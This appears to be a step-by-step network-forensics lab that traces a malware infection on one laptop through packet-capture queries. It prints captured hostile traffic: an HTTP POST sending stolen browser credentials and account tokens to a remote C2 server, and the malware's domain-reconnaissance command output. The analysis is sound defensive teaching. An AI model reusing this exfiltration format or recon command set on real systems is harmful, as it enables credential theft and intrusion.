    **Method 2: Source Raw → CyberChef**

    At the top of the open session, **Source Raw** downloads **every byte the PC sent** (headers + uploaded body) as one file. (**Destination Raw** is the server's side.) In CyberChef use the **folder icon (Open file as input)** at the top right of the Input pane; if it looks garbled, add **Strings** to the recipe to pull out readable text.

    **Method 3:** clicking the blue `90` link also downloads just the body. Open it in CyberChef the same way.

---

## Step 12 — /90: the whole reconnaissance dump { #post-90 }

The /90 body with Images & Files hidden. This is **the most decisive evidence** in the case: in plain text, **the infected PC sent its own details to the attacker**.

### Reading multipart { #multipart }

multipart splits the body with `--<boundary>`. Each part has `name="..."`, which says what it holds.

```text
--aksgja8s8d8a8s97                                   ← boundary: start of part 1
Content-Disposition: form-data; name="proclist"      ← part name

(part 1 data)
--aksgja8s8d8a8s97                                   ← start of part 2
Content-Disposition: form-data; name="sysinfo"

(part 2 data)
--aksgja8s8d8a8s97--                                 ← boundary with -- at the end = last
```

### Part 1: `name="proclist"` — the running process list { #proclist }

```text
***TASK LIST***

[System Process]
System
Registry
smss.exe
csrss.exe
wininit.exe
winlogon.exe
services.exe
lsass.exe
svchost.exe
...
MsMpEng.exe
NisSrv.exe
...
explorer.exe
...
VMMM;;;;영상ثافوزبت.exe
...
```

- Most are normal Windows processes (`svchost.exe`, `lsass.exe`, `explorer.exe` …). Attackers use the list to see **which antivirus runs and whether analysis tools are present**.
- `MsMpEng.exe` (Windows Defender) is there → **Defender was running and the PC was infected anyway**.
- **`VMMM;;;;영상ثافوزبت.exe`** in the middle — a nonsense name mixing Latin, Korean and Arabic. No Windows process is called that. **Very likely the malware's own process**, renamed after YAS20.exe ran. The name becomes an **IOC** for the host team checking the PC with tools such as Velociraptor.

### Part 2: `name="sysinfo"` — system, network and domain details { #sysinfo }

```text
***S Y S T E M I N F O***

HostName: LAPTOP-7XMV2SN
OSName: Microsoft Windows 10 Pro
OSArchitecture: 64-bit
ProductType: Workstation
RegisteredOwner: admin
TotalPhysicalMemory: 6493 Mb

/c ipconfig /all
   Host Name . . . . . . . . . . . . : LAPTOP-7XMV2SN
   Primary Dns Suffix  . . . . . . . : mondogreek.com
   Physical Address. . . . . . . . . : B8-CA-3A-EC-3B-8F
   IPv4 Address. . . . . . . . . . . : 10.3.11.194(Preferred)
   Default Gateway . . . . . . . . . : 10.3.11.1
   DHCP Server . . . . . . . . . . . : 10.3.11.3
   DNS Servers . . . . . . . . . . . : 10.3.11.3

/c net config workstation
   Computer name                        \\LAPTOP-7XMV2SN
   User name                            otis.witherspoon
   Workstation domain                   MONDOGREEK

/c net view /all
   System error 6118 has occurred.
/c net view /all /domain
   System error 6118 has occurred.

/c nltest /domain_trusts
   0: MONDOGREEK mondogreek.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
/c nltest /domain_trusts /all_trusts
   0: MONDOGREEK mondogreek.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)

***LOCAL MACHINE DATA***
User name: CN=Otis Witherspoon,CN=Users,DC=mondogreek,DC=com
Computer name: CN=LAPTOP-7XMV2SN,CN=Computers,DC=mondogreek,DC=com
Domain controller: Mondogreek-DC.mondogreek.com
Admin Name: Administrator
Admin Name: Administrator
Admin Name: Administrator
```

These are the **results of commands the malware ran on the PC**. `/c` shows they ran as `cmd.exe /c <command>`.

| Command | What it reveals |
|---|---|
| `ipconfig /all` | IP, gateway, DNS, MAC |
| `net config workstation` | Computer name, logged-on user, domain |
| `net view /all` | Other computers on the network (failed: error 6118 = "the server list is not available") |
| `net view /all /domain` | List of domains (failed) |
| `nltest /domain_trusts` (`/all_trusts`) | Domain trusts — is there a path into other domains |
| LOCAL MACHINE DATA | User and computer account paths, **DC name**, **administrator account names** |

**Cross-check:** the MAC in ipconfig, `B8-CA-3A-EC-3B-8F`, equals the Dell MAC `b8:ca:3a:ec:3b:8f` Arkime showed for 10.3.11.194. **The device Arkime saw is the device in the upload.**

### Why this is serious { #why-serious }

`nltest /domain_trusts` and the admin lookups ask **"how big is this network and who are the admins"**. Ordinary users almost never run them. The attacker is **preparing to spread from one PC to the whole domain (the DC)**. Around 2020, this kind of reconnaissance was often followed by ransomware.

Attack stages for the report:

```text
Initial Access/Execution  21:24:36       script (WinHttp) downloads YAS20.exe
Discovery                 ~21:32-21:36   public IP check, process/system/network/domain info collected
Command & Control         21:36:52~      HTTP POST reports to 203.176.135.102:8082
Exfiltration              21:36:59-21:38:49  /90 POST, about 5.4 KB of cleartext recon data
```

This fills the report's exfil checklist: time, what, bytes, method.

---

## Step 13 — /81/: stolen passwords { #post-81 }

**Goal:** see what the four `/81/` POSTs contain. They came before /90, so: an initial check-in, or something else?

**Query:**

```text
ip.dst == 203.176.135.102 && http.uri == *81*
```

| Piece | Meaning |
|---|---|
| `http.uri` | Request URI field |
| `*81*` | `*` is a wildcard for "any characters" → "URIs containing 81" |

If the wildcard does not work, just search `ip.dst == 203.176.135.102` and open the rows whose Info shows `/81/`. The Hide Images & Files setting stays on.

### The first /81/ (21:36:52) { #post-81-ie }

```http
POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ HTTP/1.1
Accept: */*
Content-Type: multipart/form-data; boundary=---------ATBOXLGQOOBDZTLA
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
Host: 203.176.135.102:8082
Content-Length: 274
Connection: Close
Cache-Control: no-cache

-----------ATBOXLGQOOBDZTLA
Content-Disposition: form-data; name="data"

https://www.facebook.com/|otis.witherspoon@mondogreek.com|P@ss********
-----------ATBOXLGQOOBDZTLA
Content-Disposition: form-data; name="source"

IE passwords
-----------ATBOXLGQOOBDZTLA--
```

(The password is masked on this page.)

The `data` part is three pieces separated by `|`:

```text
https://www.facebook.com/          ← which site
otis.witherspoon@mondogreek.com    ← username
P@ss********                       ← password
```

`IE passwords` in the `source` part means **"taken from passwords saved in Internet Explorer / Edge"**. The malware **stole saved browser passwords and sent them to the attacker in cleartext**. The server again answered with 3 bytes, "received".

**Why this is especially dangerous:** the username is a company e-mail (`@mondogreek.com`). If the user **uses the same password for the domain account**, the attacker can now log on to the domain. With the DC name and admin accounts already taken by /90, **everything for lateral movement is in place**. Hence the report recommendation: **"reset the password now and check reuse on the domain account"**.

**Other checks:**

- The **User-Agent** is `MSIE 7.0 ... Windows NT 10.0`. In step 6 we said "IE 7 on Windows 10 makes no sense, and the count 4 matches the four /81/" — confirmed. Within one malware family, **/90 used `KSKJJGJ` and /81/ a fake IE 7** — each module has its own User-Agent.
- **21:36:52** is **before** /90 (21:36:59): passwords were the first thing taken.

### The other three /81/ { #post-81-others }

| Time | Content-Length | Boundary | `source` | `data` |
|---|---|---|---|---|
| 21:36:55 | 551 | `---------XWQEFTQLCLTQBJQE` | `firefox passwords` | Firefox account tokens + <code>https://accounts.firefox.com&#124;otis.witherspoon@mondogreek.com&#124;&lt;same password&gt;</code> + `No passwords found` |
| 21:37:19 | 219 | `---------MDLIZHCZZMRSOFHE` | `OpenVPN passwords and configs` | empty |
| 21:37:52 | 210 | `---------TAGOVQVWGJFPBAJU` | `OpenSSH private keys` | empty |

`data` of 21:36:55 (token values masked):

```text
chrome://FirefoxAccounts|<account id>|{"version":1,"accountData":{"keyFetchToken":"<masked>","unwrapBKey":"<masked>"}}
https://accounts.firefox.com|otis.witherspoon@mondogreek.com|P@ss********
No passwords found
```

**Reading the result:**

```text
21:36:52  source: IE passwords                    → Facebook account + password stolen
21:36:55  source: firefox passwords               → Firefox account + password + login tokens stolen
21:37:19  source: OpenVPN passwords and configs   → data empty (nothing found)
21:37:52  source: OpenSSH private keys            → data empty (nothing found)
```

- **`/81/` = "stolen password report", `/90` = "reconnaissance report"** — the number at the end of the URI names the data type. When we only had the URI this was a guess; the contents prove it. The module **reports once per password source**.
- **The same password everywhere.** Facebook and Firefox share exactly the same password, so the domain password is likely the same too — write the **domain account takeover risk** clearly in the report.
- **Login tokens left too, not only passwords.** `keyFetchToken` and `unwrapBKey` are the Firefox Sync account's **authentication token and key**. Until the sessions are revoked they can give access to **synced bookmarks, history and saved passwords**. The recommendation adds "revoke Firefox account sessions".
- **Empty reports mean something.** OpenVPN and OpenSSH `data` are empty: the PC had **no VPN configs or SSH keys, so none leaked**. Writing "attempted, no data" tells responders they need not rotate VPN or SSH keys.

!!! danger "Report tip: mask secrets"
    Writing a password into a report **leaks it again to everyone who reads the report**. Mask part of it (`P@ss********`) and write "original in the evidence PCAP". Same for tokens.

---

## Step 14 — Hidden traffic 1: unusual ports { #step-8 }

**Goal:** HTTP stopped at 21:37:52 but the data runs until 22:06:41. Would malware that just stole passwords stay quiet for 30 minutes? Malware like this usually **keeps an encrypted (TLS) channel open** to the attacker. Start with everything except common ports.

**Query:**

```text
ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

| Piece | Meaning |
|---|---|
| `ip.src == 10.3.11.194` | Connections started by the infected PC |
| `ip.dst != 10.0.0.0/8` | Destination **not** internal. `!=` = "not equal". Keeps only traffic leaving the network |
| `port.dst != 80 && port.dst != 443 && port.dst != 53` | Without web (80), HTTPS (443) and DNS (53) |

**Actual result (SPI View → General):**

```text
Dst IP     190.214.13.2 (6)  224.0.0.252 (6)  203.176.135.102 (5)  185.14.31.98 (3)
           239.255.255.250 (3)  224.0.0.251 (2)  185.180.198.50 (1)
Protocols  tcp (15)  udp (11)  tls (9)  llmnr (6)  http (5)  ssdp (3)  mdns (2)
Src IP     10.3.11.194 (26)
```

**Reading the result:**

**First remove: multicast addresses.** `224.x.x.x` and `239.x.x.x` are not internet servers; they are **"shout to everyone on the local network"** addresses (multicast). They were not filtered only because they are not in `10.0.0.0/8`.

| Address | Protocol | Role |
|---|---|---|
| `224.0.0.252` | LLMNR | Name lookup |
| `239.255.255.250` | SSDP | Finding printers and smart devices |
| `224.0.0.251` | mDNS | Local name lookup |

All normal Windows noise. Next time add `&& ip.dst != 224.0.0.0/4` (`224.0.0.0/4` covers the whole 224–239 multicast range).

**What is left: the real suspects**

- `203.176.135.102` (5): the HTTP 8082 C2 we already know
- **`190.214.13.2` (6)**, **`185.14.31.98` (3)**, **`185.180.198.50` (1)**: new external IPs

And Protocols shows **`tls (9)`**: **9 TLS (encrypted) sessions on ports other than 443**. Normal HTTPS almost always uses 443, so this is the **hidden encrypted channel** we were looking for. 6 + 3 = 9, so probably 190.214.13.2 and 185.14.31.98.

---

## Step 15 — Hidden traffic 2: TLS certificates { #certificates }

**Goal:** even on 443 traffic can be disguised, so look at the **certificates**.

**Query:**

```text
ip.src == 10.3.11.194 && protocols == tls
```

SPI View → **cert** section → **Load All**. Look at **Issuer** (who issued it) and **Subject** (whose it is). Normal sites are issued by bodies like `DigiCert`, `Let's Encrypt`, `Microsoft`. Suspicious ones look like:

```text
Issuer ON:  Internet Widgits Pty Ltd    ← OpenSSL default left unchanged (self-signed)
Issuer CN:  example.com / localhost / random letters
Issuer = Subject                        ← signed by itself
```

**Actual result:**

```text
Issuer CN    baltimore cybertrust root (73)  microsoft it tls ca 5 (49)  microsoft it tls ca 4 (13)  microsoft it tls ca 2 (9)
             ...  example.com (4)  ...  let's encrypt authority x3 (2)  ...  cpanel, inc. certification authority (1) ...
Issuer ON    Microsoft Corporation (82)  Baltimore (73)  Global Security (4)  Digital Signature Trust Co. (2)
             Internet Widgits Pty Ltd (2)  Let's Encrypt (2)  AddTrust AB (1)  COMODO CA Limited (1)  DigiCert Inc (1)  cPanel, Inc. (1)
Issuer Org Unit  CyberTrust (73)  Microsoft IT (73)  IT Department (4)  ...
Subject CN   microsoft it tls ca 5 (49)  licensing.md.mp.microsoft.com (47)  ...  example.com (4)  ...
             filmstore.xyz (1)  hakunamatatata.com (1)  helpforyourservice.com (1)  ...
Subject ON   Microsoft Corporation (82)  Microsoft (9)  Global Security (4)  Internet Widgits Pty Ltd (2)  ...
Subject Org Unit  Microsoft IT (73)  Microsoft Corporation (49)  DSP (5)  IT Department (4)  WSE (4)
```

!!! question "Question: what are Issuer CN / ON and Subject CN / ON?"
    An HTTPS certificate is **an ID card saying "this server really is X"**. Like an ID card that says whose it is and who issued it, a certificate has two parts:

    - **Subject (owner):** **whose** certificate this is. e.g. `www.bing.com`
    - **Issuer:** **who checked and signed** it. e.g. `Microsoft IT TLS CA 5`

    Each part has several name fields:

    | Field | Meaning | Example |
    |---|---|---|
    | **CN** (Common Name) | Main name; for a website usually the **domain** | `www.bing.com` |
    | **ON** (Organization Name) | **Company / organisation**. The standard name is `O`; Arkime shows `ON` | `Microsoft Corporation` |
    | **OU** (Organizational Unit) | **Department** inside the company; `Org Unit` in Arkime | `Microsoft IT` |

    ```text
    Subject CN  = name of the certificate owner (domain)   e.g. www.bing.com
    Subject ON  = owner's organisation                     e.g. Microsoft Corporation
    Issuer CN   = name of the issuer                       e.g. Microsoft IT TLS CA 5
    Issuer ON   = issuer's organisation                    e.g. Microsoft Corporation
    ```

    **Certificates form a chain** — issuers get their own certificates from another issuer:

    ```text
    [cert 3] Subject: Baltimore CyberTrust Root   Issuer: Baltimore CyberTrust Root  ← root, signs itself
         ↓ signs
    [cert 2] Subject: Microsoft IT TLS CA 5       Issuer: Baltimore CyberTrust Root  ← intermediate issuer
         ↓ signs
    [cert 1] Subject: www.bing.com                Issuer: Microsoft IT TLS CA 5      ← the actual website
    ```

    On connection a server usually sends **certificates 1 and 2 together**. The root (3) is already in Windows, so it is not sent. That is why **`microsoft it tls ca 5` appears in both Issuer CN (49) and Subject CN (49)** above: issuer in cert 1, owner in cert 2. `baltimore cybertrust root`, on the other hand, appears only as Issuer, because the root certificate itself was not transmitted.

**Reading the result — mostly normal, with some misfits:**

Lots of `Microsoft`, `Baltimore CyberTrust`, `DigiCert`, `Let's Encrypt` because Windows talks to Microsoft servers constantly. Among them:

```text
Issuer/Subject CN:  example.com (4)
Issuer ON:          Global Security (4)       Issuer Org Unit: IT Department (4)
Issuer/Subject ON:  Internet Widgits Pty Ltd (2)
Subject CN:         filmstore.xyz (1)  hakunamatatata.com (1)  helpforyourservice.com (1)
```

- **`example.com`** is a domain **reserved for documentation examples**; no real service can get a proper certificate for it. "Global Security / IT Department" sound plausible but mean nothing. This combination (`example.com` + `Global Security` + `IT Department`) is **widely reported on Trickbot C2 certificates** (analyst knowledge, not an external lookup).
- **`Internet Widgits Pty Ltd`** is what OpenSSL fills in **when you just press Enter** while making a certificate. Real companies do not leave it like that.
- **`hakunamatatata.com`, `filmstore.xyz`, `helpforyourservice.com`** — odd domains a company PC has no reason to visit.

!!! question "Question: how did you decide the issuer and the owner were the same?"
    Honestly, at first by **inference from the SPI View counts**:

    ```text
    Issuer CN:  example.com (4)              Subject CN:  example.com (4)
    Issuer ON:  Global Security (4)          Subject ON:  Global Security (4)
    Issuer OU:  IT Department (4)            Subject OU:  IT Department (4)
    Issuer ON:  Internet Widgits Pty Ltd (2) Subject ON:  Internet Widgits Pty Ltd (2)
    ```

    The same names on both sides with **the same counts** suggested "self-signed".

    **That is not proof.** Recall the chain: `let's encrypt authority x3` also appears 2 + 2 in Issuer and Subject — not self-signed, but **because of the chain** (issuer of certificate A, owner of certificate B). And SPI View **only counts totals; it does not say which values were in the same certificate**.

    A real self-signed certificate has Issuer = Subject **inside one certificate**:

    ```text
    self-signed:   [one cert]  Subject: example.com  /  Issuer: example.com   ← equal inside one cert
    normal chain:  [cert A]    Subject: site         /  Issuer: CA X
                   [cert B]    Subject: CA X         /  Issuer: root          ← equal across two certs
    ```

    **How to verify:** open a session; the TLS part has **Certificate**, listing each certificate the server sent **separately**. Check two things:

    1. **How many certificates**: normal sites usually send 2+ (site + intermediate). Self-signed usually has **exactly 1**
    2. **Inside that one, are Issuer and Subject equal**

    [Step 16](#step-9) does exactly this and confirms it. Arkime also tags sessions automatically: **`cert:self-signed`** for self-signed, **`cert:certificate-authority`** for CA-signed — you can search the tag directly:

    ```text
    tags == "cert:self-signed"
    ```

---

## Step 16 — All suspects in one time-ordered view { #step-9 }

**Goal:** combine the three IPs from step 14 and the odd certificates from step 15 in **one query** and see when, on which port and how much each talked.

**Query:**

```text
ip.src == 10.3.11.194 && (ip.dst == 190.214.13.2 || ip.dst == 185.14.31.98 || ip.dst == 185.180.198.50 || cert.issuer.cn == example.com || cert.issuer.on == "Internet Widgits Pty Ltd" || cert.subject.cn == [filmstore.xyz, hakunamatatata.com, helpforyourservice.com])
```

| Piece | Meaning |
|---|---|
| **Parentheses `( … )`** | Needed when mixing `&&` and <code>&#124;&#124;</code>. Without them Arkime could group it wrongly — "10.3.11.194 AND 190.214.13.2" **or** "any PC with an example.com certificate". The parentheses make it "**started by 10.3.11.194, AND (any one of the inner conditions)**" |
| `cert.issuer.cn` | Certificate issuer name |
| `cert.issuer.on` | Certificate issuer organisation |
| `cert.subject.cn` | Certificate owner name |
| `[a, b, c]` | "Any of this list" — short for <code>cert.subject.cn == a &#124;&#124; cert.subject.cn == b &#124;&#124; …</code> |
| `"Internet Widgits Pty Ltd"` | Quoted because it contains spaces |

Sessions tab → **Start Time ascending** → read Start Time, Dst IP, Dst Port, Packets, Bytes. Look for:

- **Which ports** (443? 447? 449?)
- **Repetition at a steady interval** (beaconing)
- **Similar byte counts repeating** (a C2 channel that only asks "still alive?" is small and steady)

**Actual result (14 sessions, all 10.3.11.194, ascending):**

```text
Start     Stop      Dst IP:Port            Packets  Databytes / Bytes      Tags / Info
21:31:58  21:31:59  45.148.120.153:443        68     58,642 / 62,330       cert:certificate-authority  Alt Name filmstore.xyz, cpanel.filmstore.xyz ...
21:31:59  21:33:10  51.254.164.244:443       107     55,744 / 61,538       cert:self-signed
21:32:07  21:33:16  190.214.13.2:449          32      6,077 / 7,821        tls
21:35:31  21:36:46  185.180.198.50:447         6          0 / 384          tcp only
21:35:53  21:38:14  185.14.31.98:447        1,666  2,049,123 / 2,139,108   cert:self-signed
21:35:55  21:39:37  190.214.13.2:449         136     20,428 / 27,788       tls
21:35:58  21:39:31  190.214.13.2:449         117     16,273 / 22,607       tls
21:37:01  21:39:57  190.214.13.2:449          48      5,193 / 7,801        tls
21:42:12  21:46:06  190.214.13.2:449          52      8,477 / 11,301       tls
21:42:13  21:43:19  185.14.31.98:447          35     22,737 / 24,643       cert:self-signed
21:42:17  21:46:06  190.214.13.2:449          43      5,626 / 7,964        tls
21:43:40  21:43:46  199.247.13.144:443       518    541,679 / 569,667      cert:certificate-authority  Alt Name hakunamatatata.com
21:43:51  21:43:52  209.97.130.197:443       243    268,148 / 281,286      cert:certificate-authority  Alt Name helpforyourservice.com
21:44:02  21:45:08  185.14.31.98:447         111    107,501 / 113,511      cert:self-signed
```

The list may open newest-first — check the arrow on Start Time. The last session ends at 21:46:06; nothing more to these destinations until 22:06.

### Self-signed confirmed (21:44:02 session detail) { #self-signed-confirmed }

```text
General   Src  Packets 29  Bytes 2,185    Databytes 607
          Dst  Packets 82  Bytes 111,326  Databytes 106,894
          Dst IP/Port 185.14.31.98 : 447 { RIPE }    Tags cert:self-signed
TLS       Version TLSv1.2
          Cipher  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
          JA3  72a589da586844d7f0818ce684948eea
          JA3s e35df3e00ca4ef31d42b34bebaa2f86e
          JA4  t12i190700_d83cc789557e_16bbda4055b2
Certificate (only one)
          Serial 008be295cd71603289
          Not Before 2020/03/06 09:53:10 UTC   Not After 2021/03/06 09:53:10 UTC   Days Valid For 365
          Issuer Common example.com   Issuer Org Global Security   Issuer Org Unit IT Department
          Subject Common example.com  Subject Org Global Security  Subject Org Unit IT Department
```

- **Exactly one certificate**, and **inside it** issuer and owner are identical → self-signed **confirmed**. Arkime's `cert:self-signed` tag agrees.
- **Not Before 2020/03/06** — the certificate was **made 5 days before the infection**: infrastructure freshly prepared for the attack.
- **Dst (server → PC) 111,326 bytes vs Src (PC → server) 2,185 bytes** → clearly a **download**.
- **JA3** is a fingerprint of the settings the client sends when starting TLS (ClientHello); **JA3S** fingerprints the server's reply; **JA4** is a newer fingerprint format. Record them as IOCs, noting that malware using standard Windows APIs can share a JA3 with legitimate software.

### Role of each destination { #c2-roles }

**1. `190.214.13.2:449` = main C2 channel**

- **449** is a port standard services almost never use.
- Connections stay **open 3–4 minutes** with only **a few KB** each. Not file transfers — a **"any orders?" "no"** connection kept alive. Classic C2.
- Arkime could not tag a certificate for this server — the certificate was not seen — so the judgement rests on **port, raw IP and connection pattern**.

!!! info "Two kinds of beacon"
    A sample report might note a beacon like "every 2:45" — a **fixed interval**. Here the interval is irregular, and the connection is **held open** instead. There are two kinds:

    - **Short and frequent:** connects every N seconds/minutes at a steady interval — found by interval maths
    - **Long-held:** keeps the connection open waiting for orders; irregular start times, small byte counts

    190.214.13.2:449 is the second kind. In the report: "long-lived, low-byte sessions, no fixed beacon interval".

**2. `185.14.31.98:447` = download channel**

About **2 MB** at 21:35:53. Password theft (/81/) and reconnaissance (/90) started **right after** (21:36:52~). So **the functional modules (credential theft, recon …) were most likely downloaded over this channel**. The 21:44:02 session above is clearly a download.

**3. `185.180.198.50:447` = dead C2 server**

6 packets, **Databytes 0**. The PC tried to connect and the server never answered (SYN retries only). Malware carries a list of C2 addresses and **skips dead ones, trying the next**. No communication, but **still record it as an IOC** — the server could come back.

**4. Four suspicious 443 connections with proper certificates**

`filmstore.xyz`, `51.254.164.244` (self-signed), `hakunamatatata.com`, `helpforyourservice.com` are on 443, so they look like ordinary HTTPS. But they appear **right after infection and in the middle of C2 activity**, to domains a company PC has no reason to visit. At 21:43:40–51 the PC downloaded **570 KB and 281 KB back to back**. Encrypted, so **content unknown**; the grounds are "timing and domain".

**Whole flow (HTTP + TLS):**

```text
21:31:58  45.148.120.153:443   filmstore.xyz (CA cert)              62 KB
21:31:59  51.254.164.244:443   self-signed                          61 KB
21:32:00  (HTTP) checkip.amazonaws.com
21:32:07  190.214.13.2:449     TLS                                   8 KB  ← first C2
21:35:31  185.180.198.50:447   failed (0 databytes)
21:35:53  185.14.31.98:447     self-signed (example.com)         ~2 MB    ← big download
21:35:55  190.214.13.2:449     TLS (held ~4 min)                    28 KB
21:35:58  190.214.13.2:449     TLS (held ~3.5 min)                  23 KB
21:36:45~ (HTTP) cursor.png / imgpaper.png downloads, /81/ /90 POSTs
21:37:01  190.214.13.2:449     TLS                                   8 KB
21:42:12  190.214.13.2:449     TLS (held ~4 min)                    11 KB
21:42:13  185.14.31.98:447     self-signed                          25 KB
21:42:17  190.214.13.2:449     TLS (held ~4 min)                     8 KB
21:43:40  199.247.13.144:443   hakunamatatata.com (CA cert)        570 KB
21:43:51  209.97.130.197:443   helpforyourservice.com (CA cert)    281 KB
21:44:02  185.14.31.98:447     self-signed                         111 KB
21:46:06  last connection closes → nothing until 22:06
```

---

## Step 17 — Scope 1: lateral movement { #step-10 }

**Goal:** so far we have looked at 10.3.11.194 only. Before closing the report, check whether the infected PC **tried to spread to other internal PCs**.

**Query:**

```text
ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3
```

| Piece | Meaning |
|---|---|
| `ip.dst == 10.3.11.0/24` | Connections to the internal network |
| `ip.dst != 10.3.11.3` | Without the DC (talking to the DC is normal) |

If there are results, read Dst IP and Protocols in SPI View. `smb`, `dcerpc` or `rdp` to **other workstations** = a lateral-movement attempt. Only `.255` (broadcast) or nothing = no lateral movement.

**Actual result (20 sessions):**

```text
Start     Proto  Src Port  Dst IP:Port          Packets  Databytes / Bytes  Info
21:23:00  udp    137       10.3.11.255:137         15       966 / 1,596
21:23:05  udp    138       10.3.11.255:138          1       201 / 243
21:27:02  udp    138       10.3.11.255:138          1       201 / 243
21:35:00  udp    138       10.3.11.255:138          1       201 / 243
21:36:19  udp    137       10.3.11.255:137         22     1,100 / 2,024
21:36:19  udp    138       10.3.11.255:138         21     3,654 / 4,536
21:36:47  tcp    49818     10.3.11.1:445            2         0 / 120     (listed twice)
21:36:47  tcp    49919     10.3.11.218:445          6         0 / 348
21:36:47  tcp    49921     10.3.11.218:445          5        51 / 345      smb
21:36:47  tcp    49923     10.3.11.218:445          5        51 / 345      smb
21:36:47  tcp    49925     10.3.11.119:445          6         0 / 348
21:36:47  tcp    49927     10.3.11.119:445          5        51 / 345      smb
21:36:47  tcp    49929     10.3.11.119:445          5        51 / 345      smb
21:36:47  tcp    49955     10.3.11.131:445          1         0 / 66
21:36:47  tcp    50078     10.3.11.254:445          1         0 / 66
21:37:17  tcp    50095     10.3.11.218:445          5        51 / 345      smb
21:37:17  tcp    50097     10.3.11.119:445          5        51 / 345      smb
21:47:02  udp    138       10.3.11.255:138          1       201 / 243
21:59:04  udp    138       10.3.11.255:138          1       201 / 243
```

### UDP 137/138 → 10.3.11.255: mostly normal { #netbios }

`10.3.11.255` is the **broadcast address** (shouting to the whole subnet); 137/138 is **NetBIOS** (Windows announcing and finding neighbour names). **Single packets** at 21:23, 21:27, 21:35, 21:47 and 21:59 are normal Windows behaviour.

But **21:36:19–21:37:21 has 20+ packets bunched together** (22 on 137, 21 on 138). In step 12 the /90 POST contained:

```text
/c net view /all
System error 6118 has occurred.
```

`net view` asks "which PCs are around?" over NetBIOS broadcast. **The malware running net view left its trace on the network as well**; it got no answer, hence error 6118. A good example of **host evidence (the upload) and network evidence lining up at the same moment**.

### TCP 445 (SMB): a lateral-movement attempt { #smb-sweep }

**At 21:36:47, within one second**, the PC knocked on port 445 of several hosts:

```text
21:36:47  → 10.3.11.119:445   smb x2 + no data x1
21:36:47  → 10.3.11.218:445   smb x2 + no data x1
21:36:47  → 10.3.11.1:445     (gateway) 2 sessions, 0 bytes
21:36:47  → 10.3.11.254:445   1 packet, 0 bytes
21:36:47  → 10.3.11.131:445   1 packet, 0 bytes
21:37:17  → 10.3.11.119:445, 10.3.11.218:445   one more smb each
```

**Why it is suspicious:**

- **445 is SMB (file sharing).** Workstations normally do not share files with each other; SMB normally goes to file servers or the DC.
- **Five addresses in one second.** Not a person — a **scan**. The source ports also run in sequence: 49818 → 49919 → 49921 → …
- `.254` and `.131` got **a single packet (SYN) and no answer**. Never seen before, so **probably no PC exists there**; the malware pokes "just in case".
- The ones that answered are **the other two laptops (.119, .218)**. The infected PC **tested whether it could spread to them**.

**Did it succeed?** The SMB sessions are only **5 packets with 51 data bytes**, roughly:

```text
SYN → SYN-ACK → ACK → (SMB negotiate request, 51 bytes) → connection closed
```

Copying files or logging on would move KB to hundreds of KB. So it looks like **"attempted, no sign of success"**. That is also an inference, so open a session to confirm.

### Open one SMB session { #smb-session }

The 21:37:17 session `10.3.11.194:50097 → 10.3.11.119:445`. Check two things:

- **General: Src / Dst Databytes** — which side sent the 51 bytes, and whether .119 sent anything back
- **SMB section** (if present): values such as `Share` (shared folder), `User` (logon account), `Filename`

**Actual result:**

```text
Dst           Packets 2  Bytes 120  Databytes 0
Src Ethernet  b8:ca:3a:ec:3b:8f  Dell Inc.
Dst Ethernet  10:98:36:59:9d:cc  Dell Inc.
Src IP/Port   10.3.11.194 : 50097
Dst IP/Port   10.3.11.119 : 445
Payload8      Src 0000002fff534d42 ( /.SMB )
TCP Flags     SYN 1  SYN-ACK 1  ACK 1  PSH 1  RST 1  FIN 0  URG 0

Source (10.3.11.194:50097)
/.SMBr...
NT LM 0.12
```

**Reading the result:**

- The 51 bytes the infected PC sent are an **SMB Negotiate Protocol Request**. The `r` (0x72) after `\xffSMB` is the negotiate command, and the only dialect offered is **`NT LM 0.12`** — the name of the very old **SMB version 1 (SMBv1)**.
- .119 **sent no data back** (Dst Databytes 0); its 2 packets are SYN-ACK and RST. **The target refused because SMBv1 is disabled** (Windows 10 disables SMBv1 by default).
- Probing with SMBv1 only is typical of **EternalBlue (MS17-010)-style worm spreading** ([EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md)).
- **No** share, account or file activity at all → **"attempted, failed" confirmed**.

---

## Step 18 — Scope 2: did any other PC talk to the same servers? { #other-victims }

**Goal:** check whether other PCs are infected. In particular, if .119 or .218 (the SMB targets) **later talked to the malicious IPs, the lateral movement worked and they are infected**.

**Query:**

```text
ip.dst == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197] && ip.src != 10.3.11.194
```

| Piece | Meaning |
|---|---|
| `ip.dst == [...]` | Connections to **any of the 10 malicious IPs** found so far |
| `ip.src != 10.3.11.194` | …from a source that is **not** the infected PC |

**Actual result:** **0 sessions.**

**Reading the result:** no other PC talked to the malicious IPs. The infected PC is **10.3.11.194 only**; .119 and .218 show no sign of infection in the network data. A single result would have made that PC a new investigation target.

---

## Conclusion { #conclusion }

One infected PC: **LAPTOP-7XMV2SN (10.3.11.194, otis.witherspoon)**.

```text
script fetches YAS20.exe (21:24:36)
  → public IP check (21:32:00)
  → TLS C2 on 449, module download on 447 (21:32-21:46)
  → credentials + recon sent in cleartext over HTTP 8082 (21:36:52-21:38:49)
  → SMBv1 sweep of the subnet, refused (21:36:47, 21:37:17)
  → no other host involved
```

## Timeline { #timeline }

| UTC (2020-03-11) | Event |
|---|---|
| 21:22:35 | Capture starts |
| 21:24:36 | Script (`WinHttp.WinHttpRequest.5`) downloads `YAS20.exe` from bolton-tech[.]com |
| 21:31:58–59 | TLS to filmstore[.]xyz and 51.254.164.244 (self-signed) |
| 21:32:00 | Public IP check, checkip.amazonaws[.]com |
| 21:32:07 | First TLS C2 session to 190.214.13.2:449 |
| 21:35:31 | C2 attempt to 185.180.198.50:447 — no answer |
| 21:35:53 | 2.1 MB download from 185.14.31.98:447 |
| 21:36:19–21:37:21 | NetBIOS burst (`net view`) |
| 21:36:45–21:37:28 | "PNG" downloads from 64.44.133.131 |
